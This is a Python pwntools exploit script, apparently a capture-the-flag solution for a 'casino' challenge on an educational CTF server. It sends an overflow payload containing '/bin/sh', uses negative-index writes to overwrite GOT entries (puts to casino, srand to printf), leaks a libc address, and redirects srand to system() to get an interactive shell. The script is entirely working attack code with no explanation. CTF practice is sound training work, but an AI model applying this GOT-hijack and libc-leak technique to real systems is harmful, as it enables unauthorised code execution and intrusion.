from pwn import *
p = remote("edu-ctf.csie.org" , 10176)

context.arch = 'amd64'

payload = 'a' * 0x10 + '\x30\x20\x60\x00' + 'a' * 0x1c + '/bin/sh' + '\x00'
#printf_offset: 0x64e80
print(payload)

#first casino:
p.sendlineafter(': ' , payload)
p.sendlineafter(': ' , '50') #age
p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '1') # y or n

p.sendlineafter(': ' , '-43') # pos
p.sendlineafter(': ' , '4196701') # hijack puts() -> casino()

p.sendlineafter(': ' , '6') # 0
p.sendlineafter(': ' , '32')# 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '42') # 3
p.sendlineafter(': ' , '30') # 4
p.sendlineafter(': ' , '95') # 5
p.sendlineafter(': ' , '1') # y or n
p.sendlineafter(': ' , '-42') # pos
p.sendlineafter(': ' , '0') # hijack puts() -> casino()

# second casino:

p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '1') # y or n
p.sendlineafter(': ' , '-35') # pos
p.sendlineafter(': ' , '4196096') # hijack srand() -> printf()

p.sendlineafter(': ' , '6') # 0
p.sendlineafter(': ' , '32')# 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '42') # 3
p.sendlineafter(': ' , '30') # 4
p.sendlineafter(': ' , '95') # 5
p.sendlineafter(': ' , '1') # y or n
p.sendlineafter(': ' , '-34') # pos
p.sendlineafter(': ' , '0') # hijack srand() -> printf()

#third casino:
a = p.recv(6)
print(u64(a+ b'\0\0'))
libc = u64(a + b'\0\0') - 0x64e80
print(libc)
system = libc + 0x4f440
sys_str = str(hex(system))
first = int(sys_str[-8:],16)
last = int(sys_str[2:6],16)


p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '0') # y or n

p.sendlineafter(': ' , '17') # 0
p.sendlineafter(': ' , '66')# 1
p.sendlineafter(': ' , '79') # 2
p.sendlineafter(': ' , '57') # 3
p.sendlineafter(': ' , '79') # 4
p.sendlineafter(': ' , '53') # 5
p.sendlineafter(': ' , '1') # pos
p.sendlineafter(': ' , '13') # pos
p.sendlineafter(': ' , '6299936') # hijack, seed = 0x602120


#forth casino:

p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '1') # y or n
p.sendlineafter(': ' , '-35') # pos
p.sendlineafter(': ' , str(first)) # hijack srand() -> system()

p.sendlineafter(': ' , '15') # 0
p.sendlineafter(': ' , '76')# 1
p.sendlineafter(': ' , '45') # 2
p.sendlineafter(': ' , '55') # 3
p.sendlineafter(': ' , '62') # 4
p.sendlineafter(': ' , '5') # 5
p.sendlineafter(': ' , '1') # pos
p.sendlineafter(': ' , '-34') # pos
p.sendlineafter(': ' , str(last)) # hijack srand() -> system()

p.interactive()